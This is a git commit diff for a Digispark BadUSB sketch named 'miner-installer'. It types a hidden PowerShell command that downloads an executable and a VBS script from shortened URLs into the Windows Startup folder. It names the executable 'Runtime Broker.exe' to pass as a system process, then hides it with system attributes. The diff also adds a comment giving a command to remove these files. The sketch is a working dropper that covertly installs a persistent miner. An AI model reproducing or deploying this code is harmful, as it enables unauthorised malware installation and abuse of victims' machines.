0cee6ce4ce47e9214034f63b3e56967dc74d8c96
TyraVex <34800546+TyraVex@users.noreply.github.com>
2021-11-14 22:38:47 +0100

    Update miner-installer.ino

--- miner-installer/miner-installer.ino
+++ miner-installer/miner-installer.ino
@@ -5,9 +5,12 @@ void setup() {
   DigiKeyboardFr.delay(1);
   DigiKeyboardFr.sendKeyStroke(KEY_R, 0 | MOD_GUI_LEFT );
   DigiKeyboardFr.delay(50);
-  //type: powershell -windowstyle hidden -command "cd \"$env:AppData\Microsoft\Windows\Start Menu\Programs\Startup\";iwr 3.ly/acKvl -o \"Runtime Broker.exe\";iwr 3.ly/acKvu -o System.vbs";ATTRIB +H +S *.exe
+  //type: powershell -windowstyle hidden -command "cd \"$env:AppData\Microsoft\Windows\Start Menu\Programs\Startup\";iwr 3.ly/acKvl -o \"Runtime Broker.exe\";iwr 3.ly/acKvu -o System.vbs;ATTRIB +H +S \"Runtime Broker.exe\""
   DigiKeyboardFr.println("powershell -windowstyle hidden -command \"cd \\\"$env:AppData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\";iwr 3.ly/acKvl -o \\\"Runtime Broker.exe\\\";iwr 3.ly/acKvu -o System.vbs\";ATTRIB +H +S *.exe");
 }
 
 void loop() {
 }
+
+// removal command :
+// powershell -command "cd \"$env:AppData\Microsoft\Windows\Start Menu\Programs\Startup\";ATTRIB -H -S \"Runtime Broker.exe\";rm \"Runtime Broker.exe\";rm System.vbs"
